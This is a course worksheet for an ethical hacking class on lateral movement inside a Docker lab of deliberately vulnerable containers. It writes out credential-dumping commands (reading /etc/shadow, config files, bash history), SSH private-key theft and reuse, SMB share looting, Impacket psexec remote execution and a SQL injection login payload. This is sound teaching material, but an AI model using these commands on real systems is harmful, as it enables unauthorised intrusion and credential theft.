# Week 9 Student Worksheet: Lateral Movement Between Systems and Services

**CYB204 Ethical Hacking**

## Introduction

Lateral movement involves attackers moving within a network after gaining initial access to exploit vulnerabilities in other systems or services. In this worksheet, you'll practice techniques for lateral movement using the Docker virtual environment, focusing on enumerating trust relationships, credential dumping, and exploiting services.

## Learning Objectives

By the end of this worksheet, you will:

1. Understand lateral movement concepts and their significance in attacks
2. Practice lateral movement techniques on both Linux and Windows-like systems
3. Explore methods to identify and mitigate lateral movement in real-world scenarios

---

## Setup

### Start Your Docker Environment

```bash
cd movement
docker-compose up -d
```

Wait for all containers to start (first time may take 5-10 minutes).

### Verify Containers Are Running

```bash
docker-compose ps
```

You should see 8 containers in "Up" status.

### Containers Available

- **secutils**: Your primary attack client
- **workstation**: A Linux-based target
- **ubuntu-desktop**: A GUI-based Linux system
- **ldap**: LDAP directory service
- **mysql**: MySQL database
- **telnet**: Telnet service
- **juice-shop**: OWASP Juice Shop vulnerable web app
- **dvwa**: Damn Vulnerable Web Application

### Retrieve Container IP Addresses

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container_name>
```

**Quick Reference:**
- secutils: 172.20.0.10
- workstation: 172.20.0.20
- ubuntu-desktop: 172.20.0.30
- ldap: 172.20.0.40
- mysql: 172.20.0.50
- telnet: 172.20.0.60
- juice-shop: 172.20.0.70
- dvwa: 172.20.0.80

---

## Part 1: Enumerate the Network

### Task 1: Identify Active Systems

**Step 1:** Access your attack container

```bash
docker exec -it secutils /bin/bash
```

**Step 2:** Scan the network for active hosts

```bash
nmap -sP 172.20.0.0/24
```

**Question 1.1:** Which IP addresses are active?

```
Answer:
[Record the active IPs here]
```

**Step 3:** Perform a detailed scan of the workstation target

```bash
nmap -sV 172.20.0.20
```

**Question 1.2:** What services are running on the workstation target?

```
Answer:
[List the services and their versions]
```

**Step 4:** Scan other targets (ubuntu-desktop, mysql, telnet)

```bash
nmap -sV 172.20.0.30
nmap -sV 172.20.0.50
nmap -sV 172.20.0.60
```

**Question 1.3:** Create a network map with all discovered services

```
IP Address    | Hostname       | Services
--------------|----------------|------------------
172.20.0.10   | secutils       |
172.20.0.20   | workstation    |
172.20.0.30   | ubuntu-desktop |
172.20.0.40   | ldap           |
172.20.0.50   | mysql          |
172.20.0.60   | telnet         |
172.20.0.70   | juice-shop     |
172.20.0.80   | dvwa           |
```

---

## Part 2: Credential Dumping

### Task 2: Dump Linux Credentials

**Step 1:** Log in to the workstation container

```bash
docker exec -it workstation /bin/sh
```

**Step 2:** Attempt to access sensitive files

```bash
cat /etc/passwd
cat /etc/shadow
```

**Question 2.1:** Were you able to view the contents of both files? Why or why not?

```
Answer:
```

**Step 3:** Search for files with weak permissions

```bash
find / -type f -perm -o+w 2>/dev/null | head -20
```

**Question 2.2:** Did you find any files or directories with weak permissions? List them.

```
Answer:
```

**Step 4:** Search for configuration files that might contain passwords

```bash
find /home -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null
cat /home/labuser/config.txt
```

**Question 2.3:** What credentials or sensitive information did you find?

```
Answer:
```

**Step 5:** Exit the workstation container

```bash
exit
```

### Task 3: Extract Windows-Like Credentials

**Step 1:** Access the ubuntu-desktop container

```bash
docker exec -it ubuntu-desktop /bin/bash
```

**Step 2:** Search for configuration files containing passwords

```bash
find /home -name "*.config" -o -name "*.ini" 2>/dev/null
```

**Question 3.1:** What configuration files did you discover?

```
Answer:
```

**Step 3:** Examine the configuration files

```bash
find /home -type f -name "*.txt" -o -name "*.ini" 2>/dev/null -exec cat {} \;
```

**Question 3.2:** Were you able to find any stored credentials? List them.

```
Answer:
```

**Step 4:** Check bash history for useful information

```bash
cat /home/developer/.bash_history
```

**Question 3.3:** What commands were previously executed that might help in lateral movement?

```
Answer:
```

**Step 5:** Exit the ubuntu-desktop container

```bash
exit
```

---

## Part 3: Exploit Trust Relationships

### Task 4: Access Shared Resources

You should be in the **secutils** container for this task.

**Step 1:** Check for shared SMB resources on the workstation

```bash
smbclient -L //172.20.0.20 -N
```

**Question 4.1:** Are there any shared directories or files? What are they?

```
Answer:
```

**Step 2:** Access the shared directory (if available)

```bash
smbclient //172.20.0.20/shared -N
```

Once connected, use these commands:
```
smb: \> ls
smb: \> get credentials.txt
smb: \> get notes.txt
smb: \> exit
```

**Step 3:** View the downloaded files

```bash
cat credentials.txt
cat notes.txt
```

**Question 4.2:** What files are available in the shared directory? What information do they contain?

```
Answer:
```

### Task 5: Exploit Trust via SSH

**Step 1:** From the secutils container, attempt to access workstation using SSH

```bash
ssh labuser@172.20.0.20
```

Try the password: `Password123`

**Question 5.1:** Were you able to access the target? Why or why not?

```
Answer:
```

**Step 2:** If successful, search for SSH keys on the workstation

```bash
find /home -name id_rsa 2>/dev/null
cat /home/labuser/.ssh/id_rsa
```

**Question 5.2:** Did you find any SSH private keys? Where were they located?

```
Answer:
```

**Step 3:** Copy the SSH key (if found)

```bash
# Copy the key content and save it locally
exit  # Exit from workstation
```

Back in secutils:
```bash
# Create a file with the copied key
vi stolen_key
# Paste the key content, save and exit (:wq)

chmod 600 stolen_key
```

**Step 4:** Try to use the discovered key to access other systems

```bash
ssh -i stolen_key labuser@172.20.0.30
```

**Question 5.3:** Were you able to reuse the SSH key on other systems?

```
Answer:
```

---

## Part 4: Remote Code Execution

### Task 6: Exploit Remote Services

**Step 1:** Test MySQL connectivity from secutils

```bash
mysql -h 172.20.0.50 -u root -proot123
```

If successful:
```sql
SHOW DATABASES;
USE testdb;
SHOW TABLES;
EXIT;
```

**Question 6.1:** Were you able to connect to MySQL? What databases exist?

```
Answer:
```

**Step 2:** Test Telnet service (inherently insecure)

```bash
nc 172.20.0.60 23
```

Login with: `telnetuser` / `Telnet123`

**Question 6.2:** What information is transmitted in cleartext when using Telnet?

```
Answer:
```

Type `exit` to disconnect.

**Step 3:** Use Impacket for SMB-based remote execution (if SMB is available)

```bash
psexec.py labuser:Password123@172.20.0.20
```

**Question 6.3:** What privileges did you gain? Were you able to execute commands?

```
Answer:
```

**Step 4:** Explore vulnerable web applications

Open in your browser:
- Juice Shop: http://localhost:3000
- DVWA: http://localhost:8080

Try SQL injection on DVWA login:
```
Username: admin' OR '1'='1
Password: anything
```

**Question 6.4:** Were you successful with any web application exploits?

```
Answer:
```

---

## Part 5: Lateral Movement Chain

### Task 7: Demonstrate a Complete Attack Path

**Objective:** Use multiple techniques to move from secutils → workstation → ubuntu-desktop → database

Document your complete attack chain:

**Step 1:** Initial reconnaissance from secutils
```
Command:
Result:
```

**Step 2:** Gained access to workstation
```
Method:
Credentials used:
```

**Step 3:** Escalated or moved to ubuntu-desktop
```
Method:
Evidence found:
```

**Step 4:** Final objective (access database or other service)
```
Method:
Success?
```

---

## Part 6: Reflection

### Questions

**Question R.1:** What lateral movement techniques did you find most effective? Why?

```
Answer:
```

**Question R.2:** What vulnerabilities enabled lateral movement in this lab?

```
Answer:
```

**Question R.3:** How would you mitigate these vulnerabilities in a real-world environment?

```
Answer:
```

**Question R.4:** Why is lateral movement a critical phase in an attack?

```
Answer:
```

**Question R.5:** What defensive measures could detect the lateral movement techniques you used?

```
Answer:
```

---

## Submission Instructions

Submit a report containing:

1. **Network Map**: IPs, services, and open ports discovered (from Part 1)
2. **Credentials Found**: List all credentials discovered during the lab
3. **Exploitation Steps**: Commands used and their outputs for each task
4. **Attack Chain**: Complete documentation of your lateral movement path (Part 5)
5. **Reflection**: Answers to all reflection questions
6. **Screenshots**: Include evidence of successful lateral movement (minimum 5 screenshots)
   - Network scan results
   - Credential discovery
   - SMB share access
   - SSH connection
   - Remote code execution

---

## Key Takeaways

- Lateral movement enables attackers to expand their access within a network
- Weak permissions, shared resources, and misconfigurations are common vectors
- Credential reuse across systems is a major security risk
- Regular audits and strong configurations are critical for prevention
- Defense-in-depth strategies can detect and prevent lateral movement

---

## Cleanup

When finished with the lab:

**Stop containers:**
```bash
docker-compose stop
```

**Remove containers:**
```bash
docker-compose down
```

---

## Troubleshooting

**Can't connect to container:**
```bash
docker-compose restart <container_name>
```

**Container not responding:**
```bash
docker logs <container_name>
```

**Reset everything:**
```bash
docker-compose down -v
docker-compose up -d
```

---

**Lab Environment Version:** 1.0
**Compatible with:** Docker Desktop (Windows/Mac), Docker Engine (Linux)
**Last Updated:** 2025

